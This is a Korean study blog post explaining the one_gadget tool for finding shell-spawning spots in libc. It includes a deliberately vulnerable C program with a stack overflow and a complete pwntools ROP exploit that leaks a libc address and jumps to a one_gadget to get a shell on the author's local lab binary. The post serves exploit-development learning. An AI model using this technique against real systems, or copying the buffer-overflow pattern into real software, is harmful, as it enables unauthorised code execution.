---
title: "[PWNABLE] One_Gadget"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ libc 파일 내에서 execve('/bin/sh',0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.다시 말해서 stack의 ret 위치에 one_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다. 설치 방법gem ins"
date: "2024-06-24"
translation_key: "tistory-f16b9482209a"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-OneGadget"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

libc 파일 내에서 execve('/bin/sh',0,0) 과 같은 셀을 실행주는 부분을 찾아주는 tool이다.

다시 말해서 stack의 ret 위치에 one\_gadget이 들어간다면 shell을 바로 얻을 수 있다는 것이다.

#### 설치 방법

```
gem install one_gadget
```

![](/assets/images/tistory/tistory-f16b9482209a/001.png)

보통 ctf같은 곳에서는 libc파일을 제공해주지만 우리는 예제를 가지고 할 것이기 때문에 로컬 libc 파일을 가지고 해보겠다.

사용 방법은 이미지와 같이 사용하면 된다.

```
one_gadget {libc}
```

총 4개의 one\_gadget이 있다고 나와있다.

다 똑같은 거 아니냐고 말할 수 있는데, 기능은 같은게 맞지만 사용할 수 있는 상황이 다르다.

예를들어 가장 위에 있는 0x50a47를 사용하기 위해서는 rsp & 0xf한 결과가 0이어야 되고, rcx와 rbp가 0x0을 가지고 있어야 한다.

이렇게 one\_gadget이 사기적인 방법 같지만 해당 조건들이 맞는 상황에서만 사용가능하다.

아래 예제를 가지고 살펴보겠다.

```
//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void gift(){
	__asm__ ("pop %rcx");
	__asm__ ("ret");
}

int vuln(){
	char buf[100];
	printf("Hello! whrd\n");
	printf("stdout = %p\n",stdout);
	read(0,buf,256);
	printf("Good bye!\n");

	return 0;
}

int main(){
	initialize();
	vuln();

	return 0;
}
```

컴파일한 ex파일에서 vuln()의 ret에 breakpoint를 걸어준다.

![](/assets/images/tistory/tistory-f16b9482209a/002.png)

vuln()의 ret에서 멈췄을 때 상태이다. 여기서 사용가능한 one\_gadget이 있는지 확인해보겠다.

흠... 모든 one\_gadget이 조건이 맞지 않아 사용할 수가 없다.

이렇게 되면 조건을 임의로 맞춰주면 된다.

코드를 보면 첫번째 one\_gadget의 조건을 맞추기 위해 pop rcx라는 gadget을 만들어 두었다.

이를 이용해서 구해보겠다.

(stdout의 주소를 출력해주기 때문에 굳이 gadget을 만들지 않고도 libc의 gadget을 가져와 사용하면 된다.)

one\_gadget을 이용한 rop payload이다.

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)
libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(b'= ')
leak = int(p.recvn(14),16)

p_rcx = 0x00000000004011e5
ret = 0x000000000040101a
libc_base = leak - libc.sym['_IO_2_1_stdout_']
one = [0x50a47, 0xebc81, 0xebc85, 0xebc88]

print(hex(libc_base))

payload = b'a'*0x70
payload += p64(0x0)
payload += p64(p_rcx)
payload += p64(0x0)
payload += p64(libc_base + one[0])

p.send(payload)

p.interactive()
```

rbp와 rcx를 null로 맞추기 위한 과정이 들어가 있고, ret에는 one\_gadget이 들어가 shell을 얻을 . 수있게 된다.

![](/assets/images/tistory/tistory-f16b9482209a/003.png)
